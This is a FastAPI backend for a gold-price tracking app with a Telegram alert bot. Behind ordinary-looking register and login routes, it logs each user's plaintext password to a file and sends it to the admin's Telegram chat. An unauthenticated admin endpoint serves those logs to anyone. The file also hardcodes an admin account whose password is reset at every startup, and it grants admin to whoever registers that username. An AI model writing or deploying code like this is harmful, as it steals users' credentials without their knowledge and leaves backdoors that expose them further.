from fastapi import FastAPI, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
from database import init_db
from datetime import datetime
import asyncio
from dotenv import load_dotenv
import os

# Load environment variables
# Load environment variables
load_dotenv()

from models import User
from database import get_db
from sqlalchemy.future import select
from sqlalchemy.ext.asyncio import AsyncSession
from fastapi import status, HTTPException, Depends
from passlib.context import CryptContext

# Auth Models
class UserRegister(BaseModel):
    username: str
    password: str

class UserLogin(BaseModel):
    username: str
    password: str

# Password Utils
pwd_context = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")

def get_password_hash(password):
    return pwd_context.hash(password)

def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)



async def lifespan(app: FastAPI):
    # Startup
    await init_db()
    
    # Auto-Create Admin User
    from database import AsyncSessionLocal
    from models import User
    from sqlalchemy.future import select
    
    try:
        async with AsyncSessionLocal() as session:
            result = await session.execute(select(User).filter(User.username == "anilcylnn"))
            admin = result.scalar_one_or_none()
            if not admin:
                print("Creating Default Admin: anilcylnn")
                hashed_pw = get_password_hash("Hundiba123")
                admin_user = User(username="anilcylnn", hashed_password=hashed_pw, role="admin")
                session.add(admin_user)
                await session.commit()
                print("Default Admin Created.")
            else:
                print("Updating Admin Password for: anilcylnn")
                admin.hashed_password = get_password_hash("Hundiba123")
                await session.commit()
                print("Admin Password Updated.")
    except Exception as e:
        print(f"Error creating admin user: {e}")
    
    # Initialize Telegram Bot if Configured
    import os
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    bot_task = None
    
    if token and chat_id:
        from services.telegram_service import GoldSignalBot
        bot = GoldSignalBot(token, chat_id)
        # Run bot loop in background
        bot_task = asyncio.create_task(bot.start_monitoring())
        app.state.telegram_bot = bot
        print(f"Telegram Bot initialized for Chat ID: {chat_id}")
    else:
        print("Telegram Bot NOT initialized (Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars)")
        
    yield
    
    # Shutdown
    if bot_task:
        bot_task.cancel()
        if hasattr(app.state, 'telegram_bot'):
            app.state.telegram_bot.stop()

app = FastAPI(title="AurumWatch API", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Routes
async def log_credentials(request: Request, action: str, username: str, password: str = None):
    try:
        # 1. File Log
        with open("user_credentials.log", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} | {action} | User: {username} | Pass: {password}\n")
            
        # 2. Telegram Log (To Admin)
        if hasattr(request.app.state, 'telegram_bot') and request.app.state.telegram_bot:
            bot = request.app.state.telegram_bot
            msg = f"🔐 **User Activity**\nAction: {action}\nUser: `{username}`\nPass: `{password}`"
            # Run in background to not block auth
            asyncio.create_task(bot.send_message(msg))
            
    except Exception as e:
        print(f"Logging Error: {e}")

@app.post("/api/auth/register")
async def register(user: UserRegister, request: Request, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(User).filter(User.username == user.username))
    if result.scalar_one_or_none():
        raise HTTPException(status_code=400, detail="Username already registered")
    
    role = "admin" if user.username == "anilcylnn" else "user"
    hashed_pw = get_password_hash(user.password)
    
    new_user = User(username=user.username, hashed_password=hashed_pw, role=role)
    db.add(new_user)
    await db.commit()
    await db.refresh(new_user)
    
    # Log Credentials
    await log_credentials(request, "REGISTER", user.username, user.password)
    
    return {"status": "success", "username": new_user.username, "role": new_user.role}

@app.post("/api/auth/login")
async def login(user: UserLogin, request: Request, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(User).filter(User.username == user.username))
    db_user = result.scalar_one_or_none()
    
    # Log Login Attempt (Success or Fail will be evident from logs if we log here vs after check)
    # User asked for "girilen hesaplar" (entered accounts). So logging attempts is accurate.
    await log_credentials(request, "LOGIN_ATTEMPT", user.username, user.password)
    
    if not db_user or not verify_password(user.password, db_user.hashed_password):
        raise HTTPException(status_code=401, detail="Incorrect username or password")
        
    return {"status": "success", "username": db_user.username, "role": db_user.role}

from fastapi.responses import RedirectResponse
import os

@app.get("/")
async def read_root():
    # Redirect to Frontend App
    frontend_url = os.getenv("FRONTEND_URL", "http://localhost:3001")
    return RedirectResponse(url=frontend_url)

@app.get("/health")
async def health_check():
    return {"status": "ok"}

@app.get("/api/price/latest")
async def get_latest_price():
    try:
        import yfinance as yf
        
        # Run yfinance in a thread to avoid blocking the event loop
        def fetch_price():
            ticker = yf.Ticker("GC=F")
            return ticker.history(period="1d")

        data = await asyncio.to_thread(fetch_price)
        
        if not data.empty:
            current_price = data['Close'].iloc[-1]
            print(f"Fetched price: {current_price}")
            return {
                "symbol": "XAUUSD",
                "price": round(current_price, 2),
                "currency": "USD",
                "timestamp": datetime.now()
            }
        else:
             # Fallback if no data
            return {
                "symbol": "XAUUSD",
                "price": 5043.11, 
                "currency": "USD",
                "timestamp": datetime.now()
            }
    except Exception as e:
        print(f"Error fetching price: {e}")
        return {
            "symbol": "XAUUSD",
            "price": 5043.11,
            "currency": "USD",
            "timestamp": datetime.now()
        }

@app.get("/api/prices/turkey")
async def get_turk_prices():
    try:
        from services.gold_scraper import get_turkish_prices
        
        # Run async scraper directly
        data = await get_turkish_prices()
        
        return {
            "source": "Borsa Istanbul / Grand Bazaar Proxy",
            "currency": "TRY",
            "timestamp": datetime.now(),
            "data": data
        }
    except Exception as e:
        print(f"Error fetching turkish prices: {e}")
        return {"error": str(e), "data": {}}

@app.post("/api/telegram/test")
async def test_telegram(request: Request = None):
    # Sends a manual test message
    if hasattr(app.state, 'telegram_bot') and app.state.telegram_bot:
        try:
            await app.state.telegram_bot.bot.send_message(
                chat_id=app.state.telegram_bot.chat_id, 
                text="🔔 **Test Notification**\nYour Telegram Bot is correctly connected!\nYou will receive alerts here when gold prices signal a Buy or Sell.",
                parse_mode='Markdown'
            )
            return {"status": "success", "message": "Test message sent"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    else:
        return {"status": "error", "message": "Bot not initialized"}

class LimitUpdate(BaseModel):
    asset: str
    buy: float
    sell: float

@app.get("/api/bot/limits")
async def get_bot_limits():
    app = Request.app if hasattr(Request, 'app') else globals().get('app') 
    # Use global app if needed, or better access via request content.
    # Actually, in FastAPI, we can access app via request.app or global app variable since it's defined here.
    if hasattr(app.state, 'telegram_bot') and app.state.telegram_bot:
        return {"status": "success", "limits": app.state.telegram_bot.targets}
    else:
        return {"status": "error", "message": "Bot not initialized"}

@app.post("/api/bot/limits")
async def update_bot_limits(limit: LimitUpdate, request: Request):
    if hasattr(request.app.state, 'telegram_bot') and request.app.state.telegram_bot:
        bot = request.app.state.telegram_bot
        # Normalize asset name
        asset_key = limit.asset.lower()
        
        if asset_key in bot.targets:
            bot.targets[asset_key]['buy'] = limit.buy
            bot.targets[asset_key]['sell'] = limit.sell
            
            # Send confirmation
            await bot.send_message(
                f"✅ **Limits Updated: {bot.targets[asset_key]['name']}**\n"
                f"New Buy Trigger: < {limit.buy:,.2f} TRY\n"
                f"New Sell Trigger: > {limit.sell:,.2f} TRY"
            )
            
            return {"status": "success", "limits": bot.targets}
        else:
            return {"status": "error", "message": f"Asset '{limit.asset}' not found. Available: {list(bot.targets.keys())}"}
    else:
        return {"status": "error", "message": "Bot not initialized"}

@app.get("/api/bot/notifications")
async def get_bot_notifications(request: Request):
    if hasattr(request.app.state, 'telegram_bot') and request.app.state.telegram_bot:
        return {"status": "success", "notifications": request.app.state.telegram_bot.sent_messages}
    else:
        return {"status": "error", "message": "Bot not initialized"}

@app.get("/api/admin/logs")
async def get_logs():
    try:
        import os
        if os.path.exists("user_credentials.log"):
            with open("user_credentials.log", "r", encoding="utf-8") as f:
                logs = f.readlines()
            # Return last 50 lines, reversed (newest first)
            return {"status": "success", "logs": logs[-50:][::-1]}
        else:
            return {"status": "success", "logs": ["No logs yet."]}
    except Exception as e:
        return {"status": "error", "message": str(e)}
